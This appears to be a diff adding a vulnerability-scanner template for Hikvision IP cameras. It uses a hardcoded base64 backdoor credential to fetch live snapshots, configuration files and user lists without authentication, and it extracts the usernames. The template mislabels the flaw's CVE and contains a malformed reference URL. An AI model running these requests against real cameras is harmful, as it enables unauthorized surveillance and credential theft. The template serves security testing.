@@ -1,0 +1,71 @@
+id: hikvision-cam-info-exposure
+
+info:
+  name: Hikvision IP Camera - Snapshot, Config, and User Info Exposure
+  author: AbdulrahmanTamim
+  severity: high
+  description: |
+    Detects unauthenticated exposure of sensitive endpoints on vulnerable Hikvision IP cameras.
+    This includes live snapshot feeds, encrypted configuration files, and full user credential XML.
+    Based on exploit chaining of CVE-2021-36260 and related bypass logic.
+  reference:
+    - https://www.cve.org/CVERecord?id=CVE-2021-36260
+    - https://nvd.nist.nist.gov/vuln/detail/CVE-2021-36260
+    - https://seclists.org/fulldisclosure/2017/Sep/23
+  tags: hikvision,iot,camera,cve,cve2021,exposure,auth-bypass,config,snapshot,xml
+
+variables:
+  b64auth: YWRtaW46MTEK
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/onvif-http/snapshot?auth={{b64auth}}"
+    headers:
+      User-Agent: Mozilla/5.0
+    matchers:
+      - name: "Unauthenticated Snapshot Exposure"
+        type: word
+        part: header
+        words:
+          - "Content-Type: image/jpeg"
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/System/configurationFile?auth={{b64auth}}"
+    headers:
+      User-Agent: Mozilla/5.0
+    matchers:
+      - name: "Downloadable Config File"
+        type: word
+        part: header
+        words:
+          - "Content-Type: application/octet-stream"
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/Security/users?auth={{b64auth}}"
+    headers:
+      User-Agent: Mozilla/5.0
+    matchers:
+      - name: "Exposed Usernames"
+        type: word
+        words:
+          - "<userName>"
+          - "<userLevel>"
+        condition: and
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: Usernames
+        group: 1
+        regex:
+          - "<userName>(.*?)</userName>"
